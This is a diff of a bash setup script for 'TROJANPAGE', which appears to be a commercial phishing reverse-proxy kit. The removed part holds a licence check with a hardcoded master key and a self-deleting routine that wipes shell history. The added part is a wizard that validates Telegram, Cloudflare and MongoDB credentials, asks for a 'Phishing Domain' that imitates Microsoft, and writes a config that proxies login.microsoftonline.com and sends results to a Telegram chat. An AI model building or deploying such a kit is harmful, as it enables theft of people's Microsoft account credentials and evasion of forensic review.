@@ -1,103 +1,70 @@
-#!/bin/bash
-# 🏛️ TROJANPAGE - MASTER KEY EDITION (FIXED)
-# --------------------------------------------------------
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-NC='\033[0m'
+# --- 4. VERIFIED CONFIGURATION WIZARD ---
+echo -e "\n${BLUE}--- [ TROJANPAGE: CONFIGURATION WIZARD ] ---${NC}"
+echo -e "${BLUE}[!] System will verify each credential before proceeding.${NC}\n"
 
-# --- 1. THE TROJANPAGE HEADER ---
-show_header() {
-    clear
-    echo -e "${BLUE}"
-    echo "  ████████╗██████╗  ██████╗      ██╗ █████╗ ███╗   ██╗██████╗  █████╗  ██████╗ ███████╗"
-    echo "  ╚══██╔══╝██╔══██╗██╔═══██╗     ██║██╔══██╗████╗  ██║██╔══██╗██╔══██╗██╔════╝ ██╔════╝"
-    echo "     ██║   ██████╔╝██║   ██║     ██║███████║██╔██╗ ██║██████╔╝███████║██║  ███╗█████╗  "
-    echo "     ██║   ██╔══██╗██║   ██║██   ██║██╔══██║██║╚██╗██║██╔═══╝ ██╔══██║██║   ██║██╔══╝  "
-    echo "     ██║   ██║  ██║╚██████╔╝╚█████╔╝██║  ██║██║ ╚████║██║     ██║  ██║╚██████╔╝███████╗"
-    echo "     ╚═╝   ╚═╝  ╚═╝ ╚═════╝  ╚════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝"
-    echo -e "${NC}"
-    echo -e "${RED}                  [ SYSTEM ACCESS CONTROL ]${NC}"
-    echo " ----------------------------------------------------------------------------------"
-}
-
-# --- 2. MASTER KEY SETTINGS ---
-# THIS IS YOUR UNIVERSAL KEY
-MASTER_KEY="TROJAN-PRO-2026"
-HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
-
-# --- 3. THE 3-STRIKE SENTRY ---
-ATTEMPTS=0
-while [ $ATTEMPTS -lt 3 ]; do
-    show_header
-    echo -e "${GREEN}[+] SYSTEM HWID:${NC} $HWID"
-    echo -e "${BLUE}[!] Unauthorized. Enter the Master Activation Key.${NC}"
-    echo " ----------------------------------------------------------------------------------"
-    
-    read -p "ENTER KEY: " USER_INPUT
-    # Convert input to Uppercase and remove any spaces
-    CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
-
-    if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
-        echo -e "${GREEN}[success] Access Granted.${NC}"
-        sleep 1
+# A. TELEGRAM VALIDATION
+while true; do
+    read -p "Enter Telegram Bot Token: " TG_TOKEN
+    echo -ne "[...] Validating Telegram Bot..."
+    CHECK_TG=$(curl -s "https://api.telegram.org/bot$TG_TOKEN/getMe")
+    if [[ $CHECK_TG == *"\"ok\":true"* ]]; then
+        echo -e "${GREEN} [VERIFIED]${NC}"
         break
     else
-        ATTEMPTS=$((ATTEMPTS + 1))
-        echo -e "${RED}[error] Invalid Key. ($ATTEMPTS/3)${NC}"
-        sleep 1
+        echo -e "${RED} [FAILED] Token is invalid. Try again.${NC}"
     fi
+done
+read -p "Enter Telegram Chat ID: " TG_ID
 
-    if [ $ATTEMPTS -eq 3 ]; then
-        echo -e "${RED}[critical] Self-destructing...${NC}"
-        rm -- "$0"
-        history -c
-        exit 1
+# B. CLOUDFLARE VALIDATION
+while true; do
+    read -p "Enter Cloudflare API Token: " CF_TOKEN
+    echo -ne "[...] Validating Cloudflare Permissions..."
+    CHECK_CF=$(curl -s -X GET "https://api.cloudflare.com/client/v4/user/tokens/verify" \
+         -H "Authorization: Bearer $CF_TOKEN" \
+         -H "Content-Type:application/json")
+    if [[ $CHECK_CF == *"\"status\":\"active\""* ]]; then
+        echo -e "${GREEN} [VERIFIED]${NC}"
+        break
+    else
+        echo -e "${RED} [FAILED] Token is dead or lacks permissions.${NC}"
     fi
 done
 
-# --- 4. VERIFIED SETUP WIZARD ---
-# [Insert your Telegram, Cloudflare, and Mongo Checks here...]
-
-# --- 5. CREATE THE PERMANENT RUN SCRIPT ---
-cat << 'EOF' > /root/run.sh
-#!/bin/bash
-MASTER_KEY="TROJAN-PRO-2026"
-RED='\033[0;31m'
-GREEN='\033[0;32m'
-BLUE='\033[0;34m'
-NC='\033[0m'
-
-LICENSE_FILE="/root/.license"
-CURRENT_DATE=$(date +%s)
-HWID=$(hostnamectl | grep "Static hostname" | awk '{print $3}')-$(lscpu | grep "Model" | md5sum | cut -c1-8 | tr '[:lower:]' '[:upper:]')
-
-clear
-# [Header logic...]
-
-if [ -f "$LICENSE_FILE" ]; then
-    EXPIRY_DATE=$(cat "$LICENSE_FILE" | cut -d':' -f2)
-    if [ "$CURRENT_DATE" -lt "$EXPIRY_DATE" ]; then
-        # Launch engine...
-        exit 0
+# C. MONGODB ATLAS / REMOTE VALIDATION
+sudo apt update && sudo apt install -y mongodb-clients > /dev/null 2>&1
+while true; do
+    echo -e "\n${BLUE}[ MongoDB Settings ]${NC}"
+    read -p "Enter MongoDB Host (e.g. cluster0.abc.mongodb.net): " M_HOST
+    read -p "Enter MongoDB User: " M_USER
+    read -p "Enter MongoDB Pass: " M_PASS
+    echo -ne "[...] Pinging MongoDB Cluster..."
+    
+    # Validation for Atlas (+srv)
+    if mongosh "mongodb+srv://$M_USER:$M_PASS@$M_HOST/admin" --eval "db.adminCommand('listDatabases')" > /dev/null 2>&1; then
+        echo -e "${GREEN} [CONNECTED]${NC}"
+        M_URI="mongodb+srv://$M_USER:$M_PASS@$M_HOST/trojan_db?retryWrites=true&w=majority"
+        break
+    else
+        echo -e "${RED} [FAILED] Could not connect. Check Host/User/Pass.${NC}"
     fi
-fi
+done
 
-echo -e "${RED}[error] Unauthorized Access. Enter Master Key.${NC}"
-read -p "ENTER KEY: " USER_INPUT
-CLEAN_INPUT=$(echo "$USER_INPUT" | tr -d '[:space:]' | tr '[:lower:]' '[:upper:]')
+# D. DOMAIN SETUP
+read -p "Enter Your Phishing Domain (e.g., login-microsoft.com): " USER_DOMAIN
 
-if [ "$CLEAN_INPUT" == "$MASTER_KEY" ]; then
-    EXPIRY=$(($(date +%s) + 7776000))
-    echo "$HWID:$EXPIRY" > "$LICENSE_FILE"
-    sync
-    echo -e "${GREEN}[success] Activated!${NC}"
-    exec /root/run.sh
-else
-    echo -e "${RED}[error] Invalid Master Key.${NC}"
-    exit 1
-fi
+# --- 5. SAVE FINAL CONFIGURATION ---
+echo -e "${BLUE}[+] Generating Secure Config...${NC}"
+cat << EOF > /root/config.json
+{
+  "proxyDomain": "$USER_DOMAIN",
+  "listeningAddress": "0.0.0.0",
+  "listeningPortHTTPS": 443,
+  "target": "login.microsoftonline.com",
+  "telegramToken": "$TG_TOKEN",
+  "telegramChatId": "$TG_ID",
+  "mongodb": "$M_URI"
+}
 EOF
-chmod +x /root/run.sh
-ln -sf /root/run.sh /usr/local/bin/Run
-ln -sf /root/run.sh /usr/local/bin/run
+
+echo -e "${GREEN}[success] All credentials verified and saved to /root/config.json${NC}"
